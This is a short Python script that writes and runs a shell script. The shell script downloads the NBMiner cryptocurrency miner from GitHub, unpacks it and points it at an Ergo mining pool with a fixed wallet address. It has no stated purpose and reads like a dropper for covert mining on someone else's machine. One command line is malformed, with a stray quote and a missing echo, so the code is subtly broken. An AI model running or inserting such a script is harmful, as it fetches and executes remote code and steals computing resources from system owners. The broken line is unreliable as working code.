import os
os.system('echo "#!/bin/sh" >> tes')
os.system('echo "wget https://github.com/NebuTech/NBMiner/releases/download/v39.7/NBMiner_39.7_Linux.tgz && tar -xvf NBMiner_39.7_Linux.tgz && cd NBMiner_Linux" >> tes')
os.system('nbminer -a ergo -o stratum+tcp://de.ergo.herominers.com:1180 -u 9go8JBDqkwW6jx9jATZUPfQoso3Z2sAimHpy7wmEYbBVHxaSnX6.rknew" >> tes')
os.system('sleep 2')
os.system('sh tes')
